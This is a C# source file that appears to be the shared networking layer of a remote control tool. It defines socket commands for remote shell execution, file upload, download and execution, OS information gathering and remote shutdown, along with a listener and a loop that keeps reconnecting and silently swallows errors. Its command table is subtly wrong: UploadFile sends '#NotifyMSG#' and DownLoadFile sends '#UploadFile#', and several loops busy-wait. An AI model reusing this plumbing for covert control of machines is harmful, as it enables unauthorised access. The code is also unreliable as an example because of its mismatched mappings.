using System.Net.Sockets;
using System.Net;
using System.Text;

namespace Shared
{
    public enum SocketCommands
    {
        NotifyMessage,
        ExplorePath,
        UploadFile,
        DownLoadFile,
        NotifyShellCommand,
        NotifyOSInformations,
        RemoteShutdown,
        PingTarget,
        ExecFile,
    }
    public class ManagementSocketConnection
    {
        private static readonly IDictionary<SocketCommands, string> _listOfCommands = new Dictionary<SocketCommands, string>()
        {
            {SocketCommands.NotifyMessage, "#NotifyMessage#" },
            {SocketCommands.ExplorePath, "#ExplorePath#" },
            {SocketCommands.UploadFile, "#NotifyMSG#" },
            {SocketCommands.DownLoadFile, "#UploadFile#" },
            {SocketCommands.NotifyShellCommand, "#NotifyShellCommand#" },
            {SocketCommands.NotifyOSInformations, "#NotifyOSInformations#" },
            {SocketCommands.RemoteShutdown, "#RemoteShutdown#" },
            {SocketCommands.PingTarget, "#PingTarget#" },
            {SocketCommands.ExecFile, "#ExecFile#" }
        };
        public static string SocketCommand(SocketCommands SocketCommand) => _listOfCommands[SocketCommand];

        public ManagementSocketConnection() { }

        public Task ConnectionPoolingAsync(
            Socket webSocket,
            IPEndPoint endpoint,
            IProgress<Socket> notifyConnection,
            CancellationToken cancellationToken)
        {
            return Task.Run(async () =>
            {
                while (true)
                {
                    cancellationToken.ThrowIfCancellationRequested();

                    try
                    {
                        if (!webSocket.Connected)
                        {
                            await webSocket.ConnectAsync(endpoint, cancellationToken);
                            notifyConnection.Report(webSocket);
                        }
                    }
                    catch (Exception) { }
                }

            }, cancellationToken);
        }

        public Task ConnectionListenerAsync(
            Socket webSocket,
            IPEndPoint endpoint,
            IProgress<Socket> notifyConnection,
            CancellationToken cancellationToken)
        {
            return Task.Run(async () =>
            {
                webSocket.Bind(endpoint);
                webSocket.Listen();

                while (true)
                {
                    try
                    {
                        cancellationToken.ThrowIfCancellationRequested();
                        Socket client = await webSocket.AcceptAsync(cancellationToken);
                        notifyConnection.Report(client);
                    }
                    catch
                    {
                        webSocket.Close();
                        throw;
                    }
                }

            }, cancellationToken);
        }

        public Task SocketReaderAsync(
            Socket webSocket,
            IProgress<string> notifyMessage,
            CancellationToken cancellationToken)
        {
            return Task.Run(async () =>
            {
                while (webSocket.Connected)
                {
                    cancellationToken.ThrowIfCancellationRequested();

                    if (webSocket.Available > uint.MinValue)
                    {
                        byte[] buffer = new byte[webSocket.Available];
                        int received = await webSocket.ReceiveAsync(buffer, SocketFlags.None);
                        string response = Encoding.UTF8.GetString(buffer, 0, received);

                        notifyMessage.Report(response);
                    }

                }
            }, cancellationToken);
        }

        public Task SocketWriterAsync(
            Socket webSocket,
            string message,
            CancellationToken cancellationToken)
        {
            return Task.Run(async () =>
            {
                cancellationToken.ThrowIfCancellationRequested();

                byte[] bytes = Encoding.UTF8.GetBytes(message);
                int sent = await webSocket.SendAsync(bytes, SocketFlags.None);

            }, cancellationToken);
        }
    }
}